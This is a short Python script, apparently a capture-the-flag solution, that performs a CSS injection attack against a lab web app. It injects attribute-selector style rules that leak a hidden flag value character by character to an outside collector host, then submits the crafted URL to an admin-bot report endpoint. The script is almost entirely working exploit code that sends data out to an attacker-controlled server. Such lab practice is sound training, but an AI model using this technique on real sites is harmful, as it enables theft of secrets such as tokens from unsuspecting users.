#!/bin/env python3

# Repeat this script to obtain flags step by step until all flags are obtained

import requests
import base64
import urllib.parse

URL = "http://lab.scist.org:33332/{}"
REV = "http://dev.vincent55.tw:8787/"
flag = "SCIST{"

s = requests.Session()
s.post(URL.format('login'), data={"username": "test"})
char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_()}"
temp = """p[name="hereisflag"][value^="{}"] {{background: url(\"{}?q={}\");}} """
payload = ""
for c in char_set:
    payload += temp.format(flag+c, REV, flag+c)
payload = URL.format("profile?message=" +
                     urllib.parse.quote_plus(base64.b64encode(
                         f"a<style> {payload} </style>".encode()).decode()))
print(payload)
r = s.post(URL.format('report'),
           data={"url": payload})
print(r.text)
